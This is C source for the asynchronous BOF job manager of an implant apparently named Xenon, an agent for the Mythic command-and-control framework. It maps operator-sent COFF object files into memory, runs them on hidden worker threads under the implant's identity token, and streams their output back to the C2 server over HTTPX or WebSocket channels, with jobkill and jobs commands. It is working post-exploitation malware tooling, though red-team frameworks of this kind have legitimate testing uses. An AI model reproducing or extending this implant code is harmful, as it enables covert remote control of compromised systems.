#include "Tasks/AsyncBof.h"
#include "Tasks/AsyncStub.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "Identity.h"
#include "BeaconCompatibility.h"
#include "Xenon.h"
#include "Sleep.h"
#include "Debug.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)

HANDLE g_AsyncBofWakeup = NULL;

static CRITICAL_SECTION g_AsyncBofManagerLock;
static BOOL g_AsyncBofManagerInit = FALSE;
static PASYNC_BOF_CONTEXT g_AsyncBofList = NULL;

typedef struct _ASYNC_BOF_THREAD_REG {
    DWORD threadId;
    PASYNC_BOF_CONTEXT ctx;
    struct _ASYNC_BOF_THREAD_REG* Next;
} ASYNC_BOF_THREAD_REG, *PASYNC_BOF_THREAD_REG;

static PASYNC_BOF_THREAD_REG g_AsyncBofThreadRegs = NULL;

static VOID AsyncBofSyncState(PASYNC_BOF_CONTEXT ctx);

BOOL AsyncBofInitialize(void)
{
    if (g_AsyncBofManagerInit)
        return TRUE;

    InitializeCriticalSection(&g_AsyncBofManagerLock);
    g_AsyncBofWakeup = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!g_AsyncBofWakeup) {
        DeleteCriticalSection(&g_AsyncBofManagerLock);
        return FALSE;
    }
    g_AsyncBofManagerInit = TRUE;
    return TRUE;
}

VOID AsyncBofSignalWakeup(void)
{
    if (g_AsyncBofWakeup)
        SetEvent(g_AsyncBofWakeup);

    /* Interrupt HTTPX C2 idle (SleepEx alertable wait) */
    SleepWake();

#if defined(WEBSOCKET_TRANSPORT)
    if (xenonConfig && xenonConfig->WsInboundEvent)
        SetEvent(xenonConfig->WsInboundEvent);
#endif
}

BOOL AsyncBofHasRunning(void)
{
    BOOL found = FALSE;
    PASYNC_BOF_CONTEXT cur;

    if (!g_AsyncBofManagerInit)
        return FALSE;

    EnterCriticalSection(&g_AsyncBofManagerLock);
    for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
        AsyncBofSyncState(cur);
        /* Keep pumping while jobs run OR still need a final PackageComplete */
        if (cur->state == ASYNC_BOF_STATE_PENDING || cur->state == ASYNC_BOF_STATE_RUNNING) {
            found = TRUE;
            break;
        }
        if ((cur->state == ASYNC_BOF_STATE_FINISHED || cur->state == ASYNC_BOF_STATE_STOPPED)
            && !cur->completedSent) {
            found = TRUE;
            break;
        }
    }
    LeaveCriticalSection(&g_AsyncBofManagerLock);
    return found;
}

BOOL AsyncBofRegisterThread(PASYNC_BOF_CONTEXT ctx, DWORD threadId)
{
    PASYNC_BOF_THREAD_REG reg;

    if (!ctx || threadId == 0)
        return FALSE;

    if (!g_AsyncBofManagerInit)
        return FALSE;

    EnterCriticalSection(&g_AsyncBofManagerLock);

    for (reg = g_AsyncBofThreadRegs; reg != NULL; reg = reg->Next) {
        if (reg->threadId == threadId) {
            reg->ctx = ctx;
            LeaveCriticalSection(&g_AsyncBofManagerLock);
            return TRUE;
        }
    }

    reg = (PASYNC_BOF_THREAD_REG)LocalAlloc(LPTR, sizeof(ASYNC_BOF_THREAD_REG));
    if (!reg) {
        LeaveCriticalSection(&g_AsyncBofManagerLock);
        return FALSE;
    }
    reg->threadId = threadId;
    reg->ctx = ctx;
    reg->Next = g_AsyncBofThreadRegs;
    g_AsyncBofThreadRegs = reg;

    LeaveCriticalSection(&g_AsyncBofManagerLock);
    return TRUE;
}

/* Caller must hold g_AsyncBofManagerLock */
static BOOL AsyncBofRegisterThreadLocked(PASYNC_BOF_CONTEXT ctx, DWORD threadId)
{
    PASYNC_BOF_THREAD_REG reg;

    if (!ctx || threadId == 0)
        return FALSE;

    for (reg = g_AsyncBofThreadRegs; reg != NULL; reg = reg->Next) {
        if (reg->threadId == threadId) {
            reg->ctx = ctx;
            return TRUE;
        }
    }

    reg = (PASYNC_BOF_THREAD_REG)LocalAlloc(LPTR, sizeof(ASYNC_BOF_THREAD_REG));
    if (!reg)
        return FALSE;
    reg->threadId = threadId;
    reg->ctx = ctx;
    reg->Next = g_AsyncBofThreadRegs;
    g_AsyncBofThreadRegs = reg;
    return TRUE;
}

VOID AsyncBofUnregisterThread(DWORD threadId)
{
    PASYNC_BOF_THREAD_REG cur;
    PASYNC_BOF_THREAD_REG prev = NULL;

    if (!g_AsyncBofManagerInit)
        return;

    EnterCriticalSection(&g_AsyncBofManagerLock);
    cur = g_AsyncBofThreadRegs;
    while (cur) {
        if (cur->threadId == threadId) {
            if (prev)
                prev->Next = cur->Next;
            else
                g_AsyncBofThreadRegs = cur->Next;
            LocalFree(cur);
            break;
        }
        prev = cur;
        cur = cur->Next;
    }
    LeaveCriticalSection(&g_AsyncBofManagerLock);
}

PASYNC_BOF_CONTEXT AsyncBofFindByThreadId(DWORD threadId)
{
    PASYNC_BOF_CONTEXT cur;
    PASYNC_BOF_THREAD_REG reg;
    PASYNC_BOF_CONTEXT result = NULL;

    if (!g_AsyncBofManagerInit)
        return NULL;

    EnterCriticalSection(&g_AsyncBofManagerLock);

    for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
        if (cur->threadId == threadId) {
            result = cur;
            goto done;
        }
    }

    for (reg = g_AsyncBofThreadRegs; reg != NULL; reg = reg->Next) {
        if (reg->threadId == threadId) {
            result = reg->ctx;
            goto done;
        }
    }

done:
    LeaveCriticalSection(&g_AsyncBofManagerLock);
    return result;
}

PASYNC_BOF_CONTEXT AsyncBofGetOutputContext(void)
{
    /*
     * Route only by thread-ID registry. Reflective/PIC loads often break
     * __declspec(thread), so a TLS fallback would look process-global and
     * send sync BOF BeaconPrintf into a running async job.
     */
    return AsyncBofFindByThreadId(GetCurrentThreadId());
}

VOID AsyncBofAppendOutput(PASYNC_BOF_CONTEXT ctx, PCHAR data, INT len)
{
    PCHAR tempptr;

    if (!ctx || !data || len <= 0)
        return;

    EnterCriticalSection(&ctx->outputLock);
    tempptr = realloc(ctx->outputBuffer, ctx->outputSize + len + 1);
    if (!tempptr) {
        LeaveCriticalSection(&ctx->outputLock);
        return;
    }
    ctx->outputBuffer = tempptr;
    memset(ctx->outputBuffer + ctx->outputOffset, 0, len + 1);
    memcpy(ctx->outputBuffer + ctx->outputOffset, data, len);
    ctx->outputSize += len;
    ctx->outputOffset += len;
    LeaveCriticalSection(&ctx->outputLock);
}

static VOID AsyncBofClearOutputLocked(PASYNC_BOF_CONTEXT ctx)
{
    if (ctx->outputBuffer) {
        free(ctx->outputBuffer);
        ctx->outputBuffer = NULL;
    }
    ctx->outputSize = 0;
    ctx->outputOffset = 0;
}

static VOID AsyncBofFlushOutput(PASYNC_BOF_CONTEXT ctx, BOOL complete)
{
    PPackage locals = NULL;
    PCHAR snapshot = NULL;
    INT snapSize = 0;
    PCHAR extra = NULL;
    INT extraSize = 0;

    extraSize = AsyncStubDrain(ctx->stub, &extra);

    EnterCriticalSection(&ctx->outputLock);
    if (ctx->outputSize > 0 && ctx->outputBuffer) {
        snapshot = (PCHAR)malloc(ctx->outputSize + 1);
        if (snapshot) {
            memcpy(snapshot, ctx->outputBuffer, ctx->outputSize);
            snapshot[ctx->outputSize] = '\0';
            snapSize = ctx->outputSize;
        }
        AsyncBofClearOutputLocked(ctx);
    }
    LeaveCriticalSection(&ctx->outputLock);

    if (extra && extraSize > 0) {
        if (snapshot && snapSize > 0) {
            PCHAR merged = (PCHAR)malloc((SIZE_T)extraSize + (SIZE_T)snapSize + 1);
            if (merged) {
                memcpy(merged, extra, extraSize);
                memcpy(merged + extraSize, snapshot, snapSize);
                merged[extraSize + snapSize] = '\0';
                free(extra);
                free(snapshot);
                extra = merged;
                extraSize += snapSize;
                snapshot = NULL;
                snapSize = 0;
            }
        }
        if (!snapshot) {
            snapshot = extra;
            snapSize = extraSize;
            extra = NULL;
        }
    }
    if (extra)
        free(extra);

    if (snapshot && snapSize > 0) {
        locals = PackageInit(0, FALSE);
        PackageAddString(locals, snapshot, FALSE);
        if (complete)
            PackageComplete(ctx->taskUuid, locals);
        else
            PackageUpdate(ctx->taskUuid, locals);
        PackageDestroy(locals);
        free(snapshot);
    }
    else if (complete && !ctx->completedSent) {
        /* Empty final response still marks the Mythic task complete */
        PackageComplete(ctx->taskUuid, NULL);
    }

    if (complete)
        ctx->completedSent = TRUE;
}

static VOID AsyncBofCleanupThreadRegsForCtx(PASYNC_BOF_CONTEXT ctx)
{
    PASYNC_BOF_THREAD_REG cur = g_AsyncBofThreadRegs;
    PASYNC_BOF_THREAD_REG prev = NULL;
    PASYNC_BOF_THREAD_REG next;

    while (cur) {
        next = cur->Next;
        if (cur->ctx == ctx) {
            if (prev)
                prev->Next = next;
            else
                g_AsyncBofThreadRegs = next;
            LocalFree(cur);
        }
        else {
            prev = cur;
        }
        cur = next;
    }
}

static VOID AsyncBofCleanupContext(PASYNC_BOF_CONTEXT ctx)
{
    if (!ctx)
        return;

    if (ctx->hThread) {
        WaitForSingleObject(ctx->hThread, 5000);
        {
            DWORD exitCode = 0;
            GetExitCodeThread(ctx->hThread, &exitCode);
            if (exitCode == STILL_ACTIVE)
                TerminateThread(ctx->hThread, 0);
        }
        CloseHandle(ctx->hThread);
        ctx->hThread = NULL;
    }

    if (ctx->hStopEvent) {
        CloseHandle(ctx->hStopEvent);
        ctx->hStopEvent = NULL;
    }

    CoffUnmap(&ctx->coffRt);

    if (ctx->coffFile) {
        LocalFree(ctx->coffFile);
        ctx->coffFile = NULL;
    }
    if (ctx->args) {
        LocalFree(ctx->args);
        ctx->args = NULL;
    }
    if (ctx->entryName) {
        LocalFree(ctx->entryName);
        ctx->entryName = NULL;
    }

    if (ctx->stub) {
        AsyncStubDestroy(ctx->stub);
        ctx->stub = NULL;
    }

    EnterCriticalSection(&ctx->outputLock);
    AsyncBofClearOutputLocked(ctx);
    LeaveCriticalSection(&ctx->outputLock);
    DeleteCriticalSection(&ctx->outputLock);

    EnterCriticalSection(&g_AsyncBofManagerLock);
    AsyncBofCleanupThreadRegsForCtx(ctx);
    LeaveCriticalSection(&g_AsyncBofManagerLock);

    LocalFree(ctx);
}

static VOID AsyncBofSyncState(PASYNC_BOF_CONTEXT ctx)
{
    LONG st;

    if (!ctx || !ctx->stub)
        return;

    st = AsyncStubGetState(ctx->stub);
    if (st == ASYNC_BOF_STATE_RUNNING && ctx->state == ASYNC_BOF_STATE_PENDING)
        ctx->state = ASYNC_BOF_STATE_RUNNING;
    if (st == ASYNC_BOF_STATE_FINISHED && ctx->state != ASYNC_BOF_STATE_STOPPED)
        ctx->state = ASYNC_BOF_STATE_FINISHED;
}

static PASYNC_BOF_CONTEXT AsyncBofCreate(PCHAR taskUuid, PCHAR entryName, PBYTE coffFile, ULONG coffFileSize, PBYTE args, ULONG argsSize)
{
    PASYNC_BOF_CONTEXT ctx;
    SIZE_T entryLen;

    ctx = (PASYNC_BOF_CONTEXT)LocalAlloc(LPTR, sizeof(ASYNC_BOF_CONTEXT));
    if (!ctx)
        return NULL;

    memcpy(ctx->taskUuid, taskUuid, TASK_UUID_SIZE);
    ctx->taskUuid[TASK_UUID_SIZE] = '\0';
    ctx->state = ASYNC_BOF_STATE_PENDING;

    ctx->coffFile = (PBYTE)LocalAlloc(LPTR, coffFileSize);
    if (!ctx->coffFile) {
        LocalFree(ctx);
        return NULL;
    }
    memcpy(ctx->coffFile, coffFile, coffFileSize);
    ctx->coffFileSize = coffFileSize;

    if (args && argsSize > 0) {
        ctx->args = (PBYTE)LocalAlloc(LPTR, argsSize);
        if (!ctx->args) {
            LocalFree(ctx->coffFile);
            LocalFree(ctx);
            return NULL;
        }
        memcpy(ctx->args, args, argsSize);
        ctx->argsSize = argsSize;
    }

    if (!entryName || !entryName[0])
        entryName = "go";
    entryLen = strlen(entryName) + 1;
    ctx->entryName = (PCHAR)LocalAlloc(LPTR, entryLen);
    if (!ctx->entryName) {
        if (ctx->args) LocalFree(ctx->args);
        LocalFree(ctx->coffFile);
        LocalFree(ctx);
        return NULL;
    }
    memcpy(ctx->entryName, entryName, entryLen);

    ctx->hStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ctx->hStopEvent) {
        LocalFree(ctx->entryName);
        if (ctx->args) LocalFree(ctx->args);
        LocalFree(ctx->coffFile);
        LocalFree(ctx);
        return NULL;
    }

    InitializeCriticalSection(&ctx->outputLock);
    return ctx;
}

static BOOL AsyncBofStart(PASYNC_BOF_CONTEXT ctx)
{
    COFF_SYM_OVERRIDE ov[ASYNC_STUB_MAX_OVERRIDES];
    INT ovCount = 0;
    PCHAR entry = "go";
    void *entryFn;
    LPTHREAD_START_ROUTINE proc;

    if (!ctx)
        return FALSE;

    BeaconCompatibilityEnsureHashes();

    ctx->stub = AsyncStubCreate(
        ctx->args,
        ctx->argsSize,
        ctx->hStopEvent,
        g_AsyncBofWakeup,
        SleepThreadHandle(),
        gIdentityToken);
    if (!ctx->stub)
        return FALSE;

    if (!AsyncStubFillOverrides(ctx->stub, ov, ASYNC_STUB_MAX_OVERRIDES, &ovCount)) {
        AsyncStubDestroy(ctx->stub);
        ctx->stub = NULL;
        return FALSE;
    }

    /* Map while the beacon thread (and image) are unmasked. */
    if (!CoffMapEx((char*)ctx->coffFile, &ctx->coffRt, ov, ovCount, TRUE)) {
        AsyncStubDestroy(ctx->stub);
        ctx->stub = NULL;
        return FALSE;
    }

    if (ctx->entryName && ctx->entryName[0])
        entry = ctx->entryName;
    entryFn = CoffFindEntry(&ctx->coffRt, entry);
    if (!entryFn) {
        CoffUnmap(&ctx->coffRt);
        AsyncStubDestroy(ctx->stub);
        ctx->stub = NULL;
        return FALSE;
    }
    AsyncStubSetEntry(ctx->stub, (void (*)(char *, UINT32))entryFn);

    proc = AsyncStubThreadProcAddr(ctx->stub);
    if (!proc) {
        CoffUnmap(&ctx->coffRt);
        AsyncStubDestroy(ctx->stub);
        ctx->stub = NULL;
        return FALSE;
    }

    EnterCriticalSection(&g_AsyncBofManagerLock);

    /* Suspended until listed/registered so FindByThreadId works before any BeaconPrintf */
    ctx->hThread = CreateThread(NULL, 0, proc, NULL, CREATE_SUSPENDED, &ctx->threadId);
    if (!ctx->hThread) {
        LeaveCriticalSection(&g_AsyncBofManagerLock);
        CoffUnmap(&ctx->coffRt);
        AsyncStubDestroy(ctx->stub);
        ctx->stub = NULL;
        return FALSE;
    }

    AsyncBofRegisterThreadLocked(ctx, ctx->threadId);
    ctx->Next = g_AsyncBofList;
    g_AsyncBofList = ctx;

    if (ResumeThread(ctx->hThread) == (DWORD)-1) {
        if (g_AsyncBofList == ctx)
            g_AsyncBofList = ctx->Next;
        ctx->Next = NULL;
        AsyncBofCleanupThreadRegsForCtx(ctx);
        CloseHandle(ctx->hThread);
        ctx->hThread = NULL;
        LeaveCriticalSection(&g_AsyncBofManagerLock);
        return FALSE;
    }

    LeaveCriticalSection(&g_AsyncBofManagerLock);
    return TRUE;
}

static BOOL AsyncBofStopByUuid(PCHAR taskUuid)
{
    HANDLE hThread = NULL;
    BOOL found = FALSE;
    PASYNC_BOF_CONTEXT cur;

    EnterCriticalSection(&g_AsyncBofManagerLock);
    for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
        if (strncmp(cur->taskUuid, taskUuid, TASK_UUID_SIZE) == 0) {
            found = TRUE;
            if (cur->state == ASYNC_BOF_STATE_RUNNING || cur->state == ASYNC_BOF_STATE_PENDING) {
                if (cur->hStopEvent)
                    SetEvent(cur->hStopEvent);
                hThread = cur->hThread;
            }
            cur->state = ASYNC_BOF_STATE_STOPPED;
            break;
        }
    }
    LeaveCriticalSection(&g_AsyncBofManagerLock);

    if (!found)
        return FALSE;

    if (hThread) {
        DWORD waitResult = WaitForSingleObject(hThread, 3000);
        if (waitResult == WAIT_TIMEOUT)
            TerminateThread(hThread, 0);
    }

    AsyncBofSignalWakeup();
    return TRUE;
}

static VOID AsyncBofCleanupFinished(void)
{
    PASYNC_BOF_CONTEXT cur;
    PASYNC_BOF_CONTEXT prev = NULL;
    PASYNC_BOF_CONTEXT next;
    PASYNC_BOF_CONTEXT pendingHead = NULL;
    PASYNC_BOF_CONTEXT pendingTail = NULL;

    EnterCriticalSection(&g_AsyncBofManagerLock);
    cur = g_AsyncBofList;
    while (cur) {
        next = cur->Next;
        if (cur->state == ASYNC_BOF_STATE_FINISHED || cur->state == ASYNC_BOF_STATE_STOPPED) {
            if (prev)
                prev->Next = next;
            else
                g_AsyncBofList = next;

            cur->Next = NULL;
            if (!pendingHead)
                pendingHead = cur;
            else
                pendingTail->Next = cur;
            pendingTail = cur;
        }
        else {
            prev = cur;
        }
        cur = next;
    }
    LeaveCriticalSection(&g_AsyncBofManagerLock);

    cur = pendingHead;
    while (cur) {
        next = cur->Next;
        if (!cur->completedSent)
            AsyncBofFlushOutput(cur, TRUE);
        AsyncBofCleanupContext(cur);
        cur = next;
    }
}

VOID AsyncBofPush(void)
{
    typedef struct _PENDING_OUT {
        CHAR taskUuid[TASK_UUID_SIZE + 1];
        PCHAR data;
        INT len;
        BOOL complete;
        PASYNC_BOF_CONTEXT ctx;
    } PENDING_OUT;

    PENDING_OUT pending[32];
    INT pendingCount = 0;
    PASYNC_BOF_CONTEXT cur;
    BOOL threadAlive;
    BOOL finishing;
    DWORD exitCode;
    INT i;

    if (!g_AsyncBofManagerInit)
        return;

    memset(pending, 0, sizeof(pending));

    EnterCriticalSection(&g_AsyncBofManagerLock);
    for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
        AsyncBofSyncState(cur);
        threadAlive = FALSE;
        if (cur->hThread) {
            exitCode = 0;
            GetExitCodeThread(cur->hThread, &exitCode);
            threadAlive = (exitCode == STILL_ACTIVE);
        }

        if (!threadAlive && cur->state == ASYNC_BOF_STATE_RUNNING)
            cur->state = ASYNC_BOF_STATE_FINISHED;

        /*
         * Complete based on job state, not threadAlive alone.
         * The worker sets FINISHED then SignalWakeup before the thread
         * fully exits; requiring !STILL_ACTIVE raced and skipped PackageComplete
         * (especially fatal on WebSocket INFINITE wait).
         */
        finishing = (cur->state == ASYNC_BOF_STATE_FINISHED || cur->state == ASYNC_BOF_STATE_STOPPED) && !cur->completedSent;

        if (finishing && pendingCount < 32) {
            /* Final PackageComplete carries any remaining buffered output */
            pending[pendingCount].ctx = cur;
            pending[pendingCount].complete = TRUE;
            memcpy(pending[pendingCount].taskUuid, cur->taskUuid, TASK_UUID_SIZE + 1);
            pending[pendingCount].data = NULL;
            pending[pendingCount].len = 0;
            pendingCount++;
            /* Skip */
            continue;
        }

        if (threadAlive && pendingCount < 32) {
            PCHAR islandSnap = NULL;
            INT islandLen = AsyncStubDrain(cur->stub, &islandSnap);
            if (islandLen > 0 && islandSnap) {
                memcpy(pending[pendingCount].taskUuid, cur->taskUuid, TASK_UUID_SIZE + 1);
                pending[pendingCount].data = islandSnap;
                pending[pendingCount].len = islandLen;
                pending[pendingCount].complete = FALSE;
                pending[pendingCount].ctx = NULL;
                pendingCount++;
            }
            else if (islandSnap) {
                free(islandSnap);
            }
        }

        if (threadAlive && TryEnterCriticalSection(&cur->outputLock)) {
            if (cur->outputSize > 0 && cur->outputBuffer && pendingCount < 32) {
                PCHAR snapshot = (PCHAR)malloc(cur->outputSize + 1);
                if (snapshot) {
                    memcpy(snapshot, cur->outputBuffer, cur->outputSize);
                    snapshot[cur->outputSize] = '\0';
                    memcpy(pending[pendingCount].taskUuid, cur->taskUuid, TASK_UUID_SIZE + 1);
                    pending[pendingCount].data = snapshot;
                    pending[pendingCount].len = cur->outputSize;
                    pending[pendingCount].complete = FALSE;
                    pending[pendingCount].ctx = NULL;
                    pendingCount++;
                    AsyncBofClearOutputLocked(cur);
                }
            }
            LeaveCriticalSection(&cur->outputLock);
        }
    }
    LeaveCriticalSection(&g_AsyncBofManagerLock);

    for (i = 0; i < pendingCount; i++) {
        if (pending[i].complete && pending[i].ctx) {
            AsyncBofFlushOutput(pending[i].ctx, TRUE);
        }
        else if (pending[i].data) {
            PPackage locals = PackageInit(0, FALSE);
            PackageAddString(locals, pending[i].data, FALSE);
            PackageUpdate(pending[i].taskUuid, locals);
            PackageDestroy(locals);
            free(pending[i].data);
        }
    }

    AsyncBofCleanupFinished();
}

#ifdef INCLUDE_CMD_ASYNC_EXECUTE
VOID AsyncExecute(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg;
    PCHAR BofData = NULL;
    PCHAR BofArgs = NULL;
    SIZE_T bofLen = 0;
    SIZE_T argLen = 0;
    PASYNC_BOF_CONTEXT ctx;
    PPackage started;

    if (!AsyncBofInitialize()) {
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    BeaconCompatibilityEnsureHashes();

    nbArg = ParserGetInt32(arguments);
    if (nbArg < 2) {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    BofArgs = ParserGetString(arguments, &argLen);
    BofData = ParserGetString(arguments, &bofLen);

    if (BofData == NULL || bofLen == 0) {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    ctx = AsyncBofCreate(taskUuid, "go", (PBYTE)BofData, (ULONG)bofLen, (PBYTE)BofArgs, (ULONG)argLen);
    if (!ctx) {
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    if (!AsyncBofStart(ctx)) {
        AsyncBofCleanupContext(ctx);
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    started = PackageInit(0, FALSE);
    PackageAddString(started, "[*] Execution Starting\n", FALSE);
    PackageUpdate(taskUuid, started);
    PackageDestroy(started);
}
#endif

#ifdef INCLUDE_CMD_JOBKILL
VOID AsyncBofJobKill(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg;
    PCHAR targetUuid = NULL;
    SIZE_T uuidLen = 0;
    PPackage locals;

    if (!AsyncBofInitialize()) {
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    nbArg = ParserGetInt32(arguments);
    if (nbArg < 1) {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    targetUuid = ParserGetString(arguments, &uuidLen);
    if (!targetUuid || uuidLen < TASK_UUID_SIZE) {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    if (!AsyncBofStopByUuid(targetUuid)) {
        PackageError(taskUuid, ERROR_NOT_FOUND);
        return;
    }

    locals = PackageInit(0, FALSE);
    PackageAddFormatPrintf(locals, FALSE, "[*] Stopped async BOF task %.*s\n", TASK_UUID_SIZE, targetUuid);
    PackageComplete(taskUuid, locals);
    PackageDestroy(locals);
}
#endif

#ifdef INCLUDE_CMD_JOBS
VOID AsyncBofJobs(PCHAR taskUuid, PPARSER arguments)
{
    PASYNC_BOF_CONTEXT cur;
    PPackage locals;
    const char* stateStr;

    (void)arguments;

    if (!AsyncBofInitialize()) {
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    locals = PackageInit(0, FALSE);
    PackageAddString(locals, "Task UUID                              State\n", FALSE);
    PackageAddString(locals, "-------------------------------------- --------\n", FALSE);

    EnterCriticalSection(&g_AsyncBofManagerLock);
    for (cur = g_AsyncBofList; cur != NULL; cur = cur->Next) {
        AsyncBofSyncState(cur);
        switch (cur->state) {
            case ASYNC_BOF_STATE_PENDING:  stateStr = "PENDING"; break;
            case ASYNC_BOF_STATE_RUNNING:  stateStr = "RUNNING"; break;
            case ASYNC_BOF_STATE_FINISHED: stateStr = "FINISHED"; break;
            case ASYNC_BOF_STATE_STOPPED:  stateStr = "STOPPED"; break;
            default: stateStr = "UNKNOWN"; break;
        }
        PackageAddFormatPrintf(locals, FALSE, "%-36s  %s\n", cur->taskUuid, stateStr);
    }
    LeaveCriticalSection(&g_AsyncBofManagerLock);

    PackageComplete(taskUuid, locals);
    PackageDestroy(locals);
}
#endif

#endif /* async commands */
